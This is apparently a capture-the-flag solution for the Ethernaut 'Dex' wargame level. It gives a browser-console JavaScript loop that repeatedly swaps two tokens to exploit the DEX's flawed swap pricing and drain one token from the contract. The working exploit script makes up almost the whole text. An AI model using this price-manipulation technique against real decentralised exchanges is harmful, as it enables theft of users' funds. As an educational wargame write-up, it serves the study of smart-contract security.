## This can be solved entirely on the ethernaut page

In order to incrementally get all the tokens (for one of the 2) in the dex, run these:
```
await contract.approve(contract.address, 1000000)
const token1 = await contract.token1()
const token2 = await contract.token2()
let userTargetBal = await contract.balanceOf(token1, player).then(res => res.toNumber())
let userOtherBal = await contract.balanceOf(token2, player).then(res => res.toNumber())
let conTargetBal = await contract.balanceOf(token1, contract.address).then(res => res.toNumber())
let conOtherBal = await contract.balanceOf(token2, contract.address).then(res => res.toNumber())
let isToken1 = true
let targetToken = isToken1 ? token1 : token2
let otherToken = isToken1 ? token2 : token1
let targetBal = await contract.balanceOf(targetToken, contract.address).then(res => res.toNumber())
let swapAmount = await contract.getSwapPrice(targetToken, otherToken, userTargetBal).then(res => res.toNumber())

const whileLoop = async () => {
    while (targetBal > 0){
        userTargetBal = await contract.balanceOf(targetToken, player).then(res => res.toNumber())
        swapAmount = await contract.getSwapPrice(targetToken, otherToken, userTargetBal).then(res => res.toNumber())
        conOtherBal = await contract.balanceOf(otherToken, contract.address).then(res => res.toNumber())
        if (swapAmount <= conOtherBal) {
            await contract.swap(targetToken, otherToken, userTargetBal)
        }
        else {
            conTargetBal = await contract.balanceOf(targetToken, contract.address).then(res => res.toNumber())
            await contract.swap(targetToken, otherToken, conTargetBal)
        }
        isToken1 = !isToken1
        targetToken = isToken1 ? token1 : token2
        otherToken = isToken1 ? token2 : token1
        targetBal = await contract.balanceOf(targetToken, contract.address).then(res => res.toNumber())
    }
}
whileLoop()
```